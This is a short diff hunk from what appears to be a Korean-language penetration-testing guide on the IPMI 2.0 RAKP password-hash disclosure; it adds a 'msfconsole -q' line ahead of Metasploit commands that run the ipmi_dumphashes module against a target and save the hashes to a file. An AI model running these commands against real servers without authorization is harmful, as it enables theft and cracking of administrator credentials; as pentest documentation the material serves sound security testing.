@@ -65,6 +65,7 @@ IPMI 2.0 의 RAKP 프로토콜은 유효한 사용자명에 대해 비밀번호�
 
 ```bash
 # Metasploit - 해시 덤프
+msfconsole -q
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 msf6 > set RHOSTS <IP>
 msf6 > set OUTPUT_FILE ipmi.hash       # 해시를 파일로 저장
